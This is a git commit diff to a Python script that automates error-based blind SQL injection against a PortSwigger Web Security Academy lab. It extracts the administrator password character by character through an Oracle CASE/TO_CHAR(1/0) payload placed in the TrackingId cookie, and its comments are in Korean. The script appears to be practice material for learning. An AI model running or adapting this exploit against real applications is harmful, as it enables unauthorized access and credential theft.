da9f82b072f80fe63acc89336ea275b599d98587
Youngmin Jo <54759844+designeryoungmin@users.noreply.github.com>
2024-08-17 08:10:04 +0900

    Add differnt case

--- blind_sqli01.py
+++ blind_sqli01.py
@@ -1,10 +1,12 @@
 import requests
 import string
 
-# Case 1
-# Return differnt HTTP response page whether injected conditional queries are true or not
+# Case 2
+# 주입한 조건부 쿼리가 참일 경우, 에러 발생(HTTP 500 Internal Server Error), 거짓일 경우 정상적인 페이지(HTTP Status Cdoe == 200) 
+# Error-based Blind SQLi
 # Burp Suite Academy Blind SQLi 실습 머신에 적용
-url = "https://0a1d009a04ab2194834600cc000b006d.web-security-academy.net/"
+# 실험실 URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+url = "https://0a14003b0357400280270325007a001e.web-security-academy.net/"
 tracking_id = "trackingIdValue"
 session_cookie = "sessionCookieValue"
 username = "administrator"
@@ -17,11 +19,11 @@ def find_password():
     password = ""
     for i in range(1, password_length + 1): # 1 ~ 20까지 순회 # 비밀번호 20자리
         for char in charset:
-            payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='{username}')='{char}"
+            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
             cookies = {'TrackingId': tracking_id + payload, 'session': session_cookie}
             response = requests.get(url, cookies=cookies)
             
-            if "Welcome back!" in response.text:  # 탐지 성공 조건
+            if "Internal Server" in response.text:  # 탐지 성공 조건 # HTTP Status code == 500
                 password += char
                 print(f"현재까지 찾은 비밀번호: {password}")
                 break
